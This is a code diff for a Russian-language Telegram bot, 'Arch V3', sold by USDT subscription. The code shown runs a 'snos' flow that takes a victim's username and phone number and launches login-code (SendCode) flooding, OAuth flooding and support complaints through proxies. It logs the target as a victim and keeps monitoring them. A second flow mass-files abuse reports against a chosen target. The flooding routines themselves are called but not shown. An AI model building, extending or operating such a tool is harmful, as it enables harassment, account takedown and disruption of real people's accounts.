+    m = re.match(r"^(?:https?://)?(?:t\.me|telegram\.me)/(@?[A-Za-z0-9_]{4,64})/?$", raw, re.I)
+    uname = m.group(1) if m else (raw if re.match(r"^@?[A-Za-z0-9_]{4,64}$", raw) else "")
+    if uname.startswith("@"):
+        uname = uname[1:]
+    if not uname:
+        await msg.answer("\u274c \u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 username. \u0415\u0449\u0451 \u0440\u0430\u0437:")
+        return
+    await state.update_data(username=uname)
+    data = await state.get_data()
+    await msg.answer(
+        snos_summary_text(data),
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_snos_confirm(),
+    )
+    await state.set_state(None)
+
+
+@router.callback_query(F.data.startswith("snosrun:"))
+async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
+    action = cb.data.split(":", 1)[1]
+    if action != "yes":
+        caption = hero_caption(cb.from_user.id)
+        try:
+            await cb.message.delete()
+        except Exception:
+            pass
+        card = await user_card_path(cb.bot, cb.from_user)
+        await cb.message.answer_photo(
+            photo=FSInputFile(card),
+            caption=caption,
+            parse_mode=ParseMode.HTML,
+            show_caption_above_media=True,
+            reply_markup=kb_main(cb.from_user.id))
+        await state.clear()
+        await cb.answer()
+        return
+
+    data = await state.get_data()
+    username = data.get("username")
+    phone = data.get("phone")
+    if not username or not phone:
+        await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)
+        return
+
+    await cb.answer("\u23f3 \u0417\u0430\u043f\u0443\u0441\u043a...")
+
+    async def snos_task():
+        return await run_snos_flow(cb, username, phone, progress)
+
+    progress = {"step": "\u23f3 \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430"}
+    task = asyncio.create_task(snos_task())
+
+    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
+    started = asyncio.get_event_loop().time()
+    i = 0
+    while not task.done():
+        frame = sp_frames[i % len(sp_frames)]
+        elapsed = int(asyncio.get_event_loop().time() - started)
+        anim = (
+            bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
+            + "\n\n"
+            + f"<b>{frame}</b> {html_mod.escape(progress.get('step', ''))}\n"
+            + f"\U0001f3af @{html_mod.escape(username)}\n"
+            + f"\U0001f4f1 <code>{phone}</code>\n"
+            + f"\u23f1 {elapsed}s"
+        )
+        try:
+            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
+                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
+        except Exception:
+            pass
+        i += 1
+        await asyncio.sleep(2.0)
+
+    try:
+        res = await task
+    except Exception as e:
+        log.error("snos task crashed: %s", e)
+        res = {"username": username, "phone": phone, "victim": {"ok": False, "error": f"{type(e).__name__}"},
+               "sendcode": [], "oauth": [], "support": []}
+
+    # ── log file ──
+    LOGS_DIR.mkdir(exist_ok=True)
+    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_path = LOGS_DIR / f"snos_{username}_{stamp}.txt"
+    lines = [
+        f"Arch V3 \u2014 \u0441\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
+        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        f"\u0416\u0435\u0440\u0442\u0432\u0430: @{username}",
+        f"\u041d\u043e\u043c\u0435\u0440: {phone}",
+        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
+        "",
+    ]
+    v = res["victim"]
+    photo_word = "\u0434\u0430" if v.get("has_photo") else "\u043d\u0435\u0442"
+    about_word = "\u0434\u0430" if v.get("about") else "\u043d\u0435\u0442"
+    if v.get("ok"):
+        lines.append(f"[\u2713] \u0416\u0435\u0440\u0442\u0432\u0430: id {v['id']} | "
+                     f"\u0430\u0432\u0430\u0442\u0430\u0440\u043a\u0430: {photo_word} | "
+                     f"\u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: {about_word}")
+    else:
+        lines.append(f"[\u2717] \u0416\u0435\u0440\u0442\u0432\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430: {v.get('error', '?')}")
+
+    lines.append("\n\u2500\u2500\u2500 SendCode \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
+    sc_ok = 0
+    for d in res.get("sendcode", []):
+        mark = "\u2705" if d["ok"] else "\u274c"
+        lines.append(f"{mark} {d['name']} | {d.get('proxy', '-')} | {d.get('status', '')}")
+        sc_ok += 1 if d["ok"] else 0
+    sc_total = len(res.get("sendcode", []))
+
+    lines.append("\n\u2500\u2500\u2500 OAuth \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
+    oa_ok = 0
+    for d in res.get("oauth", []):
+        mark = "\u2705" if d["ok"] else "\u274c"
+        err = f" | {d['err']}" if d.get("err") else ""
+        lines.append(f"{mark} {d.get('service', '?')} | {d.get('proxy', '-')}{err}")
+        oa_ok += 1 if d["ok"] else 0
+    oa_total = len(res.get("oauth", []))
+
+    lines.append("\n\u2500\u2500\u2500 Web support \u2500\u2500\u2500")
+    ws_ok = 0
+    for d in res.get("support", []):
+        mark = "\u2705" if d["ok"] else "\u274c"
+        err = f" | {d['err']}" if d.get("err") else ""
+        lines.append(f"{mark} {d.get('name', '?')} | {d.get('proxy', '-')}{err}")
+        ws_ok += 1 if d["ok"] else 0
+    ws_total = len(res.get("support", []))
+
+    lines.append("")
+    lines.append(f"\u0418\u0442\u043e\u0433: SendCode {sc_ok}/{sc_total} | OAuth {oa_ok}/{oa_total} | Support {ws_ok}/{ws_total}")
+    log_path.write_text("\n".join(lines), encoding="utf-8")
+
+    # ── final message ──
+    v = res["victim"]
+    head = ("\u2705 <b>\u0417\u0430\u043f\u0443\u0449\u0435\u043d\u043e</b>" if v["ok"]
+            else "\u274c <b>\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c</b>")
+    text = (
+        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
+        + "\n\n" + head + "\n\n"
+        + f"\U0001f3af <b>@</b>{html_mod.escape(username)}\n"
+        + f"\U0001f4f1 <code>{phone}</code>\n\n"
+        + f"\U0001f50d \u0416\u0435\u0440\u0442\u0432\u0430: "
+        + (f"<code>{html_mod.escape(str(v['id']))}</code>" if v["ok"] else "<i>" + html_mod.escape(v["error"]) + "</i>") + "\n"
+        + f"\U0001f4f2 SendCode: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
+        + f"\U0001f310 OAuth: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
+        + f"\U0001f4e8 Support: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
+        + f"\U0001f552 {datetime.now().strftime('%H:%M:%S')}"
+    )
+    if v["ok"]:
+        text += "\n\n\U0001f50d \u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433 \u0437\u0430\u043f\u0449\u0435\u043d (\u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d)"
+    try:
+        await cb.message.delete()
+    except Exception:
+        pass
+    card = await user_card_path(cb.bot, cb.from_user)
+    await cb.message.answer_photo(
+        photo=FSInputFile(card), caption=text,
+        parse_mode=ParseMode.HTML, reply_markup=kb_main(cb.from_user.id))
+
+    await cb.message.answer_document(
+        document=FSInputFile(log_path),
+        caption="\U0001f4c4 \u041b\u043e\u0433",
+        reply_markup=kb_main(cb.from_user.id),
+    )
+
+    if v["ok"]:
+        asyncio.create_task(snos_monitor_loop(
+            username, v["id"], v["has_photo"], v["about"],
+            cb.bot, cb.from_user.id,
+        ))
+
+    await state.clear()
+# ── report flow ─────────────────────────────────────────
+@router.message(Report.target)
+async def got_target(msg: Message, state: FSMContext):
+    target = parse_target(msg.text or "")
+    if not target["entity"]:
+        await msg.answer("\u274c \u041d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u0446\u0435\u043b\u044c. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.")
+        return
+    await state.update_data(target=target)
+    await msg.answer(
+        bq(f"<b>{NAME}</b>")
+        + f"\n\n\U0001f3af <code>{target['raw']}</code>\n\n"
+        + "\U0001f4ac <b>\u041d\u0430\u043f\u0438\u0448\u0438\u0442\u0435 \u0442\u0435\u043a\u0441\u0442 \u0436\u0430\u043b\u043e\u0431\u044b</b> \u0438\u043b\u0438 \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u0435:",
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_skip(),
+    )
+    await state.set_state(Report.comment)
+
+
+@router.callback_query(Report.reason, F.data.startswith("reason:"))
+async def got_reason(cb: CallbackQuery, state: FSMContext):
+    key = cb.data.split(":", 1)[1]
+    if key not in REASONS:
+        await cb.answer("\u274c", show_alert=True)
+        return
+    await state.update_data(reason=key)
+    data = await state.get_data()
+    m = METHODS[data["method"]]
+    r = REASONS[key]
+    await cb.message.edit_caption(
+        caption=(
+            bq(f"<b>{NAME}</b>")
+            + f"\n\n{r['e']} <b>{r['l']}</b>\n\n"
+            + f"\U0001f50d {m['hint']}"
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:reasons")],
+        ]),
+    )
+    await state.set_state(Report.target)
+    await cb.answer()
+
+
+@router.callback_query(F.data == "back:reasons")
+async def back_reasons(cb: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    m = METHODS.get(data.get("method", "message"), METHODS["message"])
+    await cb.message.edit_caption(
+        caption=(
+            bq(f"<b>{NAME}</b>")
+            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
+            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_reasons(),
+    )
+    await state.set_state(Report.reason)
+    await cb.answer()
+
+
+@router.callback_query(Report.comment, F.data == "skip_comment")
+async def skip_comment(cb: CallbackQuery, state: FSMContext):
+    await state.update_data(comment="")
+    data = await state.get_data()
+    await safe_edit(cb.message,
+        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
+    await state.set_state(Report.confirm)
+    await cb.answer()
+
+
+@router.message(Report.comment)
+async def got_comment(msg: Message, state: FSMContext):
+    await state.update_data(comment=msg.text or "")
+    data = await state.get_data()
+    await msg.answer(
+        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
+    await state.set_state(Report.confirm)
+
+
+@router.callback_query(Report.confirm, F.data.startswith("confirm:"))
+async def got_confirm(cb: CallbackQuery, state: FSMContext):
+    action = cb.data.split(":", 1)[1]
+    if action != "yes":
+        caption = hero_caption(cb.from_user.id)
+        try:
+            await cb.message.delete()
+        except Exception:
+            pass
+        card = await user_card_path(cb.bot, cb.from_user)
+        await cb.message.answer_photo(
+            photo=FSInputFile(card),
+            caption=caption,
+            parse_mode=ParseMode.HTML,
+            show_caption_above_media=True,
+            reply_markup=kb_main(cb.from_user.id),
+        )
+        await state.clear()
+        await cb.answer()
+        return
+
+    data = await state.get_data()
+    t = data["target"]
+    r = REASONS[data["reason"]]
+    m = METHODS[data["method"]]
+    c = data.get("comment", "")
+    ts = datetime.now().strftime("%H:%M:%S")
+
+    await cb.answer("\u23f3 \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...")
+
+    is_web = data["method"] == "web"
+    unit_name = "\u0437\u0430\u044f\u0432\u043e\u043a" if is_web else "\u0437\u0430\u043f\u0443\u0441\u043a\u043e\u0432"
+    tgt_raw = t["raw"]
+    esc_raw = html_mod.escape(tgt_raw)
+
+    if is_web:
+        report_task = asyncio.create_task(fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
+    else:
+        report_task = asyncio.create_task(
+            fire_reports(t["entity"], data["reason"], c, t.get("msg_id")))
+
+    # ── loading animation while workers run ──
+    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
+    started = asyncio.get_event_loop().time()
+    i = 0
+    while not report_task.done():
+        frame = sp_frames[i % len(sp_frames)]
+        elapsed = int(asyncio.get_event_loop().time() - started)
+        anim = (
+            bq(f"<b>{NAME}</b>  \u2014  \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430")
+            + "\n\n"
+            + f"<b>{frame}</b> \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...\n\n"
+            + f"\U0001f3af <code>{esc_raw}</code>\n"
+            + f"\u26a0\ufe0f {r['e']} {r['l']}\n"
+            + f"\u23f1 {elapsed}s"
+        )
+        try:
+            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
+                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
+        except Exception:
+            pass
+        i += 1
+        await asyncio.sleep(2.0)
+
+    try:
+        res = await report_task
+    except Exception as e:
+        log.error("report task crashed: %s", e)
+        res = {"ok": 0, "fail": 1, "total": 1,
+               "details": [{"name": "worker", "proxy": "-",
+                            "ok": False, "err": f"{type(e).__name__}: {e}"}]}
+    res.setdefault("details", [])
+    ok = res["ok"]
+    total = res["total"]
+    # ── write log txt ──
+    LOGS_DIR.mkdir(exist_ok=True)
+    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_path = LOGS_DIR / f"report_{stamp}.txt"
+    dash = "\u2014"
+    log_lines = [
+        f"Arch V3 \u2014 \u0436\u0443\u0440\u043d\u0430\u043b \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
+        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        f"\u041c\u0435\u0442\u043e\u0434: {m['l']}",
+        f"\u0426\u0435\u043b\u044c: {tgt_raw}",
+        f"\u041f\u0440\u0438\u0447\u0438\u043d\u0430: {r['l']}",
+        f"\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439: {c or dash}",
+        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
+        f"\u0418\u0442\u043e\u0433: {ok}/{total} {unit_name} \u0443\u0441\u043f\u0435\u0448\u043d\u043e",
+        "",
+        "\u2500\u2500\u2500 \u0434\u0435\u0442\u0430\u043b\u0438 \u2500\u2500\u2500",
+    ]
+    for d in res["details"]:
+        mark = "✅" if d["ok"] else "❌"
+        line = f"{mark} {d['name']} | {d['proxy']}"
+        if not d["ok"] and d["err"]:
+            line += f" | {d['err']}"
+        log_lines.append(line)
+    log_path.write_text("\n".join(log_lines), encoding="utf-8")
+
+    # ── final screen ──
+    head = "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430</b>"
+    text = (
+        bq(f"<b>{NAME}</b>  \u2014  \u0413\u043e\u0442\u043e\u0432\u043e")
+        + "\n\n"
+        + head + "\n\n"
+        + f"\U0001f3af <code>{esc_raw}</code>\n"
+        + f"\u26a0\ufe0f {r['e']} {r['l']}\n"
+        + f"\u26a1 \u0412\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e\n"
+        + f"\U0001f552 {ts}"
+    )
+    try:
+        await cb.message.delete()
+    except Exception:
+        pass
+    card = await user_card_path(cb.bot, cb.from_user)
+    await cb.message.answer_photo(
+        photo=FSInputFile(card),
+        caption=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_main(cb.from_user.id),
+    )
+
+    await cb.message.answer_document(
+        document=FSInputFile(log_path),
+        caption="\U0001f4c4 \u041b\u043e\u0433 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
+        reply_markup=kb_main(cb.from_user.id),
+    )
+
+    if POOL_CHAT_ID:
+        comment_text = c if c else "\u043d\u0435\u0442"
+        me = m["e"]
+        ml = m["l"]
+        re_ = r["e"]
+        rl = r["l"]
+        traw = t["raw"]
+        uname = cb.from_user.full_name
+        uid = cb.from_user.id
+        pool_text = (
+            bq(f"<b>{NAME}</b>  \u2014  \u041d\u043e\u0432\u0430\u044f \u0436\u0430\u043b\u043e\u0431\u0430")
+            + f"\n\n\U0001f464 <b>\u041e\u0442:</b> {uname} (<code>{uid}</code>)"
+            + f"\n{me} <b>\u041c\u0435\u0442\u043e\u0434:</b> {ml}"
+            + f"\n\U0001f3af <b>\u0426\u0435\u043b\u044c:</b> <code>{traw}</code>"
+            + f"\n\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b> {re_} {rl}"
+            + f"\n\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b> {comment_text}"
+            + f"\n\U0001f4e6 {ok}/{total}"
+            + f"\n\U0001f552 {ts}"
+        )
+        try:
+            await cb.bot.send_message(int(POOL_CHAT_ID), pool_text, parse_mode=ParseMode.HTML)
+        except Exception as e:
+            log.warning("pool send failed: %s", e)
+
+    log.info("report: %s | %s | %d/%d", t["raw"], data["reason"], res["ok"], res["total"])
+    await state.clear()
+
+
+# ── subscriptions (xRocket Pay) ─────────────────────────
+SUBS_FILE = Path(__file__).parent / "subs.json"
+XROCKET_API = "https://pay.api.xrocket.exchange/api/v1"
+XROCKET_CURRENCY = "USDT"
+
+SUB_PLANS = {
+    "d1":   {"label": "1 \u0434\u0435\u043d\u044c",     "days": 1,   "price": 0.5},
+    "d7":   {"label": "7 \u0434\u043d\u0435\u0439",     "days": 7,   "price": 2.0},
+    "d30":  {"label": "30 \u0434\u043d\u0435\u0439",    "days": 30,  "price": 6.0},
+    "fore": {"label": "\u041d\u0430\u0432\u0441\u0435\u0433\u0434\u0430", "days": None, "price": 12.0},
+}
+
+
+def load_subs() -> dict:
+    if SUBS_FILE.exists():
+        try:
+            return json.loads(SUBS_FILE.read_text(encoding="utf-8"))
+        except Exception:
+            return {}
+    return {}
+
+
+def save_subs(subs: dict) -> None:
+    SUBS_FILE.write_text(json.dumps(subs, ensure_ascii=False, indent=1),
+                         encoding="utf-8")
+
+
+def user_is_admin(user_id: int) -> bool:
+    return bool(ADMIN_ID) and user_id == int(ADMIN_ID)
+
+
+def sub_quality(subs: dict, user_id: int) -> tuple[str, str]:
+    """(state, until_str). state: admin|forever|active|free|expired"""
+    if user_is_admin(user_id):
+        return "admin", "\u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
+    rec = subs.get(str(user_id), {})
+    if rec.get("forever"):
+        return "forever", "\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
+    until = rec.get("until", 0)
+    if until and until > time.time():
+        d = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M")
+        return "active", d
+    if until:
+        return "expired", "\u0438\u0441\u0442\u0435\u043a\u043b\u0430"
+    return "free", "\u2014"
+
+
+async def sub_gate(cb: CallbackQuery, state: FSMContext) -> bool:
+    """Call inside menu handlers; returns True to continue flow."""
+    subs = load_subs()
+    s, until = sub_quality(subs, cb.from_user.id)
+    if s in ("admin", "forever", "active"):
+        return True
+    caption = (
+        bq(f"<b>{NAME}</b>  \u2014  \u0422\u0430\u0440\u0438\u0444\u044b")
+        + "\n\n\u270b \u0414\u043e\u0441\u0442\u0443\u043f \u043f\u043e \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0435. \u0426\u0435\u043d\u044b \u0434\u0435\u0448\u043c\u0430\u043d\u0441\u043a\u0438\u0435:\n"
+    )
+    for pk, pl in SUB_PLANS.items():
+        caption += f"\u2022 <b>{pl['label']}</b> \u2014 <b>{pl['price']:g} USDT</b>\n"
+    caption += (
+        "\n\u041e\u043f\u043b\u0430\u0442\u0430 \u2014 xRocket (\u043a\u0440\u0438\u043f\u0442\u043e, USDT). "
+        "\u041f\u043e\u0441\u043b\u0435 \u043e\u043f\u043b\u0430\u0442\u044b \u0436\u043c\u0438 <b>\u041f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c</b>."
+    )
+    rows = []
+    for pk, pl in SUB_PLANS.items():
+        rows.append([InlineKeyboardButton(
+            text=f"\U0001f4b0 {pl['label']} \u2014 {pl['price']:g} USDT",
+            callback_data=f"sub:buy:{pk}")])
+    rows.append([InlineKeyboardButton(text="\U0001f50d \u041f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c", callback_data="sub:check")])
+    rows.append([InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")])
+    await state.clear()
+    try:
+        await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
+                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+    except Exception:
+        pass
+    await cb.answer()
+    return False
+
+
+async def xrocket_create_invoice(amount: float, payload: dict, description: str) -> dict:
+    headers = {
+        "Authorization": f"Bearer {XROCKET_TOKEN}",
+        "Content-Type": "application/json",
+    }
+    body = {
+        "priceAmount": f"{amount:.2f}",
+        "priceCurrency": XROCKET_CURRENCY,
+        "description": description[:1000],
+        "clientInvoiceId": f"archv3_{payload['plan']}_{payload['tgId']}_{int(time.time())}",
+        "data": payload,
+    }
+    async with aiohttp.ClientSession() as s:
+        async with s.post(f"{XROCKET_API}/invoices", json=body, headers=headers,
+                          timeout=aiohttp.ClientTimeout(total=20)) as r:
+            j = await r.json(content_type=None)
+            return j
+
+
+async def xrocket_get_invoice(invoice_id: str) -> dict:
+    headers = {
+        "Authorization": f"Bearer {XROCKET_TOKEN}",
+        "Content-Type": "application/json",
+    }
+    async with aiohttp.ClientSession() as s:
+        async with s.get(f"{XROCKET_API}/invoice",
+                         params={"invoiceId": invoice_id},
+                         headers=headers,
+                         timeout=aiohttp.ClientTimeout(total=20)) as r:
+            j = await r.json(content_type=None)
+            return j
+
+
+# ── required channel gate ───────────────────────────────
+def get_channel_id() -> int:
+    raw = os.getenv("SUB_CHANNEL_ID", "").strip()
+    if raw:
+        try:
+            return int(raw)
+        except ValueError:
+            pass
+    subs = load_subs()
+    v = subs.get("__channel_id")
+    try:
+        return int(v or 0)
+    except (TypeError, ValueError):
+        return 0
+
+
+def set_channel_id(cid: int) -> None:
+    subs = load_subs()
+    subs["__channel_id"] = cid
+    save_subs(subs)
+
+
+@router.my_chat_member()
+async def on_bot_chat_member(cm, ):
+    """Auto-save the private channel id once the bot is added there."""
+    chat = cm.chat
+    if getattr(chat, "type", "") == "channel":
+        if get_channel_id() != chat.id:
+            set_channel_id(chat.id)
+            log.info("sub channel saved: %s (%s)", chat.id, chat.title)
+        return
+
+
+async def channel_gate(cb: CallbackQuery, state: FSMContext) -> bool:
+    """Require membership in the private channel before any flow."""
+    if user_is_admin(cb.from_user.id):
+        return True
+    cid = get_channel_id()
+    if not cid:
+        await cb.answer(
+            "\U0001f512 \u041a\u0430\u043d\u0430\u043b \u043d\u0430 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0435, \u0437\u0430\u0433\u043b\u044f\u043d\u0438 \u043f\u043e\u0437\u0436\u0435",
+            show_alert=True)
+        return False
+    ok = False
+    try:
+        member = await cb.bot.get_chat_member(cid, cb.from_user.id)
+        ok = member.status in ("member", "administrator", "creator")
+    except Exception as e:
+        log.warning("channel check failed: %s", e)
+    if ok:
+        return True
+    caption = (
+        bq(f"<b>{NAME}</b>  \u00b7  \u0434\u043e\u0441\u0442\u0443\u043f")
+        + "\n\n\U0001f512 <b>\u0422\u043e\u043b\u044c\u043a\u043e \u0434\u043b\u044f \u043f\u043e\u0434\u043f\u0438\u0441\u0447\u0438\u043a\u043e\u0432 \u043a\u0430\u043d\u0430\u043b\u0430</b>:"
+        + "\n\u0432\u0441\u0442\u0443\u043f\u0430\u0439 \u2014 \u0438 \u0436\u043c\u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c"
+    )
+    rows = [
+        [InlineKeyboardButton(text="\U0001f4dd \u0412\u0441\u0442\u0443\u043f\u0438\u0442\u044c \u0432 \u043a\u0430\u043d\u0430\u043b", url=SUB_CHANNEL_LINK)],
+        [InlineKeyboardButton(text="\u2705 \u042f \u043f\u043e\u0434\u043f\u0438\u0441\u0430\u043b\u0441\u044f", callback_data="menu:launch")],
+    ]
+    try:
+        await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
+                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+    except Exception:
+        pass
+    await state.clear()
+    await cb.answer()
+    return False
+
+
+def activate_plan(subs: dict, user_id: int, plan_key: str) -> dict:
+    pl = SUB_PLANS[plan_key]
+    rec = subs.setdefault(str(user_id), {})
+    if pl["days"] is None:
+        rec["forever"] = True
+    else:
+        base = rec.get("until", 0)
+        start = max(base, time.time())
+        rec["until"] = start + pl["days"] * 86400
+    save_subs(subs)
+    return rec
+
+
+# ── subscriptions UI ────────────────────────────────────
+@router.callback_query(F.data.startswith("sub:buy:"))
+async def sub_buy(cb: CallbackQuery, state: FSMContext):
+    if not XROCKET_TOKEN:
+        await cb.answer("\u041e\u043f\u043b\u0430\u0442\u0430 \u043d\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u0430 (XROCKET_TOKEN)", show_alert=True)
+        return
+    pk = cb.data.rsplit(":", 1)[1]
+    pl = SUB_PLANS.get(pk)
+    if not pl:
+        await cb.answer("\u274c", show_alert=True)
+        return
+    payload = {"kind": "sub", "plan": pk, "tgId": str(cb.from_user.id)}
+    try:
+        j = await xrocket_create_invoice(pl["price"], payload,
+                                         f"{NAME} subscription {pl['label']}")
+    except Exception as e:
+        log.error("xrocket invoice failed: %s", e)
+        await cb.answer("\u274c \u0421\u0435\u0440\u0432\u0438\u0441 \u043e\u043f\u043b\u0430\u0442\u044b \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d", show_alert=True)
+        return
+    inv_id = j.get("id")
+    pay_url = (j.get("links") or {}).get("telegramBotLink")
+    if not inv_id or not pay_url:
+        log.error("xrocket bad invoice: %s", j)
+        await cb.answer("\u274c \u0418\u043d\u0432\u043e\u0439\u0441 \u043d\u0435 \u0441\u043e\u0437\u0434\u0430\u043d", show_alert=True)
+        return
+    data = await state.get_data()
+    pend = data.get("pend", {})
+    pend[str(inv_id)] = {"user": cb.from_user.id, "plan": pk, "ts": time.time()}
+    await state.update_data(pend=pend)
+    price_s = f"{pl['price']:g}"
+    caption = (
+        bq(f"<b>{NAME}</b>  \u2014  \u041e\u043f\u043b\u0430\u0442\u0430")
+        + f"\n\n\U0001f4b3 <b>{pl['label']}</b> \u2014 <b>{price_s} USDT</b>\n"
+        + f"\U0001f9fe <b>Invoice:</b> <code>{inv_id}</code>\n\n"
+        + "\u041e\u043f\u043b\u0430\u0442\u0438 \u0432 @xrocket \u043f\u043e \u043a\u043d\u043e\u043f\u043a\u0435,\n"
+        + "\u0437\u0430\u0442\u0435\u043c \u0432\u0435\u0440\u043d\u0438\u0441\u044c \u0438 \u043d\u0430\u0436\u043c\u0438 "
+        + "<b>\U0001f50d \u041f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c</b>."
+    )
+    await cb.message.edit_caption(
+        caption=caption, parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\U0001f4b3 \u041e\u043f\u043b\u0430\u0442\u0438\u0442\u044c", url=pay_url)],
+            [InlineKeyboardButton(text="\U0001f50d \u041f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c", callback_data=f"sub:check:{inv_id}")],
+            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="sub:shop")],
+        ]),
+    )
+    await cb.answer()
+
+
+@router.callback_query(F.data == "sub:shop")
+async def sub_shop(cb: CallbackQuery, state: FSMContext):
+    subs = load_subs()
+    s, until = sub_quality(subs, cb.from_user.id)
+    caption = (
+        bq(f"<b>{NAME}</b>  \u2014  \u0422\u0430\u0440\u0438\u0444\u044b")
+        + f"\n\n\u270f \u0421\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435: <b>{s}</b>"
+        + (f" ({until})" if until != "\u2014" else "")
+    )
+    for pk, pl in SUB_PLANS.items():
+        caption += f"\n\u2022 <b>{pl['label']}</b> \u2014 <b>{pl['price']:g} USDT</b>"
+    rows = []
+    for pk, pl in SUB_PLANS.items():
+        rows.append([InlineKeyboardButton(
+            text=f"\U0001f4b0 {pl['label']} \u2014 {pl['price']:g} USDT",
+            callback_data=f"sub:buy:{pk}")])
+    rows.append([InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")])
+    await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
+                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+    await cb.answer()
+
+
+@router.callback_query(F.data.startswith("sub:check"))
+async def sub_check(cb: CallbackQuery, state: FSMContext):
+    parts = cb.data.split(":")
+    subs = load_subs()
+    if len(parts) == 3:
+        inv_id = parts[2]
+        data = await state.get_data()
+        pend = data.get("pend", {})
+        info = pend.get(inv_id)
+        if not info:
+            info = {"user": cb.from_user.id, "plan": None, "ts": 0}
+        try:
+            j = await xrocket_get_invoice(inv_id)
+        except Exception as e:
+            log.error("xrocket status failed: %s", e)
